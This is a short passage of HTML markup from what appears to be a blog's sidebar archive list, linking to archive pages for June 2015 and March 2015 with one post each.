class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
